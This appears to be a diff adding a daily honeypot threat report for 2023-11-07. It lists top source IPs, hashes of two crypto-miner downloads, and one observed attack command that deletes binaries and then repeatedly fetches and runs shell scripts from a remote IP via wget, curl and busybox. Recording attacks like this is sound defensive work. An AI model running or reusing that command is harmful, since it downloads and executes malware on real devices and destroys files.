@@ -1,0 +1,19 @@
+Top 5 IPs for 2023-11-07:
+18.207.255.191
+44.213.77.70
+175.30.72.166
+64.176.168.187
+114.239.42.127
+
+
+Top malware downloads:
+File name: eyshcjdmzg
+File Hash: ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+File name: sshd
+File Hash: 9fa8e1aaad7c6e5fb17d839db348f2f0632550622691754fcd11ae76d18e63a3
+
+Both crypto miners.
+
+Malicious commands seen:
+
+cd /data/local/tmp/; rm -rf *arm*; rm -rf *arm5*; rm -rf *arm6*; rm -rf *arm7*; rm -rf *m68k*; rm -rf *mips*; rm -rf *mpsl*; rm -rf *ppc*; rm -rf *sh4*; rm -rf *spc*; rm -rf *x86*; rm -rf *x86_64*;busybox wget http://103.178.229.177/w.sh; sh w.sh; curl http://103.178.229.177/c.sh; sh c.sh; wget http://103.178.229.177/wget.sh; sh wget.sh; curl http://103.178.229.177/wget.sh; sh wget.sh; busybox wget http://103.178.229.177/wget.sh; sh wget.sh; busybox curl http://103.178.229.177/wget.sh; sh wget.sh
